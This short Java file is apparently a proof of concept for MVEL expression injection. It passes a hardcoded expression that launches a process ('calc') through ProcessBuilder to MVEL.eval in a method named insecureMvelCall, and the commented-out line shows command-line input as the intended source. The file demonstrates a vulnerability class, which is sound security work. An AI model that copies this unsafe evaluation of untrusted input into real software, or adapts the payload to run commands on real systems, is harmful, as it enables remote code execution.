package com.SugarP1g.mvelInjection;

import org.mvel2.MVEL;

import java.util.HashMap;
import java.util.Map;

public class POC {

    public static void main(String[] args) {
        // String exp = args[1];
        String exp = "a=123;new java.lang.ProcessBuilder(\"calc\").start();";
        insecureMvelCall(exp);
    }

    private static void insecureMvelCall(String exp) {
        Map vars = new HashMap();
        vars.put("foobar", new Integer(100));
        String result = MVEL.eval(exp, vars).toString();
    }
}
